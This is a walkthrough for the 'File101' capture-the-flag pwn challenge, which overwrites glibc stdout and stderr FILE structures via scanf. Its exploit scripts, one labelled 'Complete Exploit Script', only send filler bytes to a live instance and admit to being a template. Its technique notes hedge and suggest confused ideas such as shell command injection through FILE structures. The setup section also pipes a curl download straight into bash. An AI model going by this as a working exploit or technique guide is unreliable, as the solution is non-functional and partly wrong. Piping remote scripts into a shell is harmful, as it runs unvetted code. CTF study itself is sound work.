# File101 PWN Challenge Walkthrough

## Challenge Overview

**Challenge Name:** File101  
**Author:** Flagyard  
**Category:** PWN  
**Instance URL:** 34.252.33.37:31712

This challenge tests your understanding of standard I/O and FILE structure manipulation in C.

## Vulnerability Analysis

### Source Code Analysis

```c
#include <stdio.h>

void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("stdout:");
  scanf("%224s", (char*)stdout);
  puts("stderr:");
  scanf("%224s", (char*)stderr);
}
```

**Key Vulnerabilities:**
1. **Direct FILE Structure Overwrite**: The program reads user input directly into the `stdout` and `stderr` FILE structures
2. **Buffer Overflow**: 224 bytes can be written to each FILE structure
3. **Standard I/O Manipulation**: By controlling these structures, we can redirect output

### FILE Structure Basics

In glibc, FILE structures contain various fields including:
- `_IO_read_ptr`, `_IO_read_end` - Read buffer pointers
- `_IO_write_base`, `_IO_write_ptr`, `_IO_write_end` - Write buffer pointers
- `_fileno` - File descriptor
- `_vtable_offset` - Virtual table offset
- `vtable` - Pointer to virtual function table

## Environment Setup (Kali Linux)

### Prerequisites

```bash
# Update Kali Linux
sudo apt update && sudo apt upgrade -y

# Install required tools
sudo apt install -y gdb pwntools python3-pip netcat-traditional
pip3 install pwntools

# Install GEF for better GDB experience
bash -c "$(curl -fsSL https://gef.blahcat.com/sh)"
```

### Tools Overview

1. **GDB with GEF** - For debugging and analyzing the binary
2. **pwntools** - Python library for exploit development
3. **netcat** - For connecting to the remote instance
4. **hexdump/xxd** - For examining binary data

## Exploitation Strategy

### Step 1: Understanding the Target

The goal is to manipulate the FILE structures to redirect output and read the flag file.

### Step 2: FILE Structure Layout Analysis

```bash
# First, let's analyze the binary
file chall
checksec chall  # If you have pwntools installed
```

### Step 3: Local Testing

```bash
# Make the binary executable
chmod +x chall

# Test basic functionality
echo -e "AAAA\nBBBB" | ./chall
```

## Exploitation Technique

### Method 1: FILE Structure Hijacking

The key insight is that we can overwrite the FILE structures to:
1. Redirect `stdout` to read from a file instead of writing to it
2. Use the `_IO_str_jumps` vtable to control execution flow

### Creating the Exploit

Create a Python script using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

# Context setup
context.arch = 'amd64'
context.log_level = 'debug'

def exploit_local():
    # For local testing
    p = process('./chall')
    return exploit(p)

def exploit_remote():
    # For remote instance
    p = remote('34.252.33.37', 31712)
    return exploit(p)

def exploit(p):
    # Receive the first prompt
    p.recvuntil(b'stdout:')
    
    # First payload - manipulate stdout
    # We need to craft a FILE structure that redirects output
    payload1 = b'A' * 224
    p.sendline(payload1)
    
    # Receive the second prompt
    p.recvuntil(b'stderr:')
    
    # Second payload - manipulate stderr
    payload2 = b'B' * 224
    p.sendline(payload2)
    
    # Try to get output
    try:
        response = p.recvall(timeout=5)
        print(f"Response: {response}")
    except:
        pass
    
    p.close()

if __name__ == "__main__":
    # Test locally first
    print("Testing locally...")
    exploit_local()
    
    # Then try remote
    print("Trying remote...")
    exploit_remote()
```

### Advanced Exploitation

For a more sophisticated approach, we need to:

1. **Leak libc base** - Find the base address of libc
2. **Craft proper FILE structures** - Create valid FILE structures that redirect I/O
3. **Use _IO_str_jumps** - Exploit the virtual table mechanism

## Step-by-Step Exploitation Guide

### Step 1: Connect to the Instance

```bash
# Connect to the challenge instance
nc 34.252.33.37 31712
```

### Step 2: Analyze the Behavior

```bash
# Send test input to understand the crash
echo -e "test\ntest" | nc 34.252.33.37 31712
```

### Step 3: Advanced FILE Exploitation

The challenge likely requires us to:

1. **Redirect stdout to a file descriptor** that can read the flag
2. **Use _IO_str_overflow** to trigger file operations
3. **Manipulate the FILE structure fields** to control I/O operations

### Step 4: Flag Extraction Strategy

Based on the Dockerfile, the flag is in a file with format `/flag-<md5hash>.txt`. We need to:

1. List directory contents to find the flag file
2. Open and read the flag file
3. Output the contents

## Complete Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
import struct

# Configuration
HOST = '34.252.33.37'
PORT = 31712

def create_file_structure():
    """
    Create a crafted FILE structure to exploit the vulnerability
    """
    # This is a simplified approach - in practice, you'd need to
    # carefully craft the FILE structure based on glibc version
    
    # Basic FILE structure template
    file_struct = b'\x00' * 224
    
    # You would modify specific offsets here based on your analysis
    # For example:
    # file_struct = file_struct[:8] + p64(read_ptr) + file_struct[16:]
    
    return file_struct

def main():
    print("[+] Connecting to target...")
    
    try:
        # Connect to remote instance
        p = remote(HOST, PORT)
        
        print("[+] Connected! Sending exploit...")
        
        # Wait for first prompt
        p.recvuntil(b'stdout:')
        
        # Send first payload
        payload1 = create_file_structure()
        p.sendline(payload1)
        
        # Wait for second prompt
        p.recvuntil(b'stderr:')
        
        # Send second payload
        payload2 = create_file_structure()
        p.sendline(payload2)
        
        # Try to receive flag or any output
        print("[+] Waiting for response...")
        try:
            response = p.recvall(timeout=10)
            print(f"[+] Response received:")
            print(response.decode('utf-8', errors='ignore'))
            
            # Look for flag pattern
            if b'FLAG{' in response or b'flag{' in response:
                print("[+] FLAG FOUND!")
            
        except Exception as e:
            print(f"[-] Error receiving response: {e}")
        
        p.close()
        
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    main()
```

## Alternative Approaches

### Method 1: Directory Listing
Try to manipulate FILE structures to execute `ls /` to find the flag file.

### Method 2: Direct File Reading
If you can determine the flag filename pattern, try to open it directly.

### Method 3: Command Injection
Look for ways to inject shell commands through the FILE structure manipulation.

## Tips for Success

1. **Study FILE structure layout** - Understanding glibc FILE structures is crucial
2. **Use GDB for analysis** - Debug the binary locally to understand memory layout
3. **Try different payloads** - The exact exploitation method depends on the glibc version
4. **Monitor for crashes** - Some payloads might crash the program in useful ways
5. **Look for information leaks** - Any output can provide valuable information

## Common FILE Exploitation Techniques

1. **_IO_str_overflow exploitation**
2. **FSOP (File Stream Oriented Programming)**
3. **vtable hijacking**
4. **FILE structure corruption for arbitrary read/write**

## Expected Flag Format

Based on typical CTF conventions, the flag should be in format:
- `FLAG{...}` or `flag{...}`
- Located in `/flag-<hash>.txt` according to the Dockerfile

## Troubleshooting

If the basic approach doesn't work:

1. **Analyze the exact glibc version** used in the target
2. **Study the FILE structure layout** for that specific version
3. **Try simpler approaches** like causing controlled crashes
4. **Look for unintended solutions** like buffer overflows in other parts

Good luck with the challenge!